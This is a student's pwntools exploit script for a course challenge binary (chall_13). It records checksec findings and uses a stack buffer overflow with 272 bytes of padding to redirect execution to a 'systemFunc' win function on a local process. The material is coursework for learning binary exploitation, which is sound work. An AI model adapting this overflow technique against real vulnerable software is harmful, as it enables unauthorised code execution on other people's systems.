'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_13
File Description:  

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71) Symbols       No    0               1               chall_13

File info:
chall_13: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=50d7f91524fb809e3d7c9fa548720f94bb821eaf, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Vulns:
    Well no canary and no PIE
    Win function call systemFunc
    Can do a ROP maybe or can I just overflow and call system func?
    Not printf due to only using puts
'''

# Import libraries
from pwn import *

# Creating ELF
elf = ELF("./chall_13")

# Padding ie offset to vuln
padding = b'a'*268 + b'd'*4   # Buffer holds 268 + 4 bytes for ebp

# Start process and send payload
p = process("./chall_13")

# Send Payload after its creation
winFunc = p32(elf.sym.systemFunc)
payload = padding + winFunc
p.sendline(payload)
p.interactive()